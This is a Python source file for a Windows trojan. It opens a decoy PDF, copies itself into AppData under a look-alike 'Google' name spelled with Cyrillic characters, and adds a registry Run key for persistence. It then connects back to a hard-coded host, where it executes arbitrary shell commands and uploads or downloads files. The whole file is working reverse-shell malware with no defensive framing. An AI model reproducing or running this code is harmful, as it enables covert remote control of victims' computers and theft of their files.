#!/usr/bin/env python
import socket, sys, subprocess, json, os, base64, shutil


class socket_server:
    def __init__(self, ip, port):
        self.reg_ubload()
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((ip, port))

    def reg_ubload(self):
        file_name = os.environ["appdata"] + "\\Goоglе\\google.exe"
        if not os.path.exists(file_name):
            shutil.copyfile(sys.executable, file_name)
            subprocess.call(r'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Gооglе /t REG_SZ /d "{0}"'.format(file_name), shell=True)

    def reliable_send(self, data):
        json_data = json.dumps(data.decode('utf-8'))
        self.s.send(bytes(json_data, 'utf-8'))

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.s.recv(1024).decode('utf-8')
                return json.loads(json_data)
            except ValueError:
                continue

    def cd_metod(self, path):
        try:
            os.chdir(path)
            return "[+] cd " + path
        except FileNotFoundError or WindowsError or OSError:
            return "[-] Error, don't have derectoria."

    def file_criate(self, path):
        try:
            with open(path, "rb") as file_name:
                return base64.b64encode(file_name.read())
        except FileNotFoundError or WindowsError:
            return "[-] Error, don't have file.".encode('utf-8')

    def upload_file(self, path, file):
        with open(path, "wb") as file_upload:
            file_upload.write(base64.b64decode(file.encode('utf-8')))
            return "[+] Upload file ....".encode('utf-8')

    def execute_command(self, command):
        if command[0] == "exit":
            self.s.close()
            exit()
        elif command[0] == "upload" and "[-] Error, don't have file." not in command[2]:
            return self.upload_file(command[1], command[2])
        elif command[0] == "download":
            return self.file_criate(command[1])
        elif command[0] == "cd" and len(command) > 1:
            return self.cd_metod(command[1]).encode('utf-8')
        else:
            try:
                return subprocess.check_output(' '.join(command), shell=True)
            except subprocess.CalledProcessError:
                return "[-] Error, don't have command, or file".encode('utf-8')

    def run(self):
        while True:
            try:
                r = self.reliable_receive()
                command = self.execute_command(r)
            except Exception:
                command = "[-] Error don't thing."
            self.reliable_send(command)
        self.s.close()


if __name__ == '__main__':
    file_name = sys._MEIPASS + r"\sample.pdf"
    subprocess.Popen(file_name, shell=True)
    try:
        connect = socket_server("192.168.1.6", 8080)
        connect.run()
    except Exception:
        sys.exit()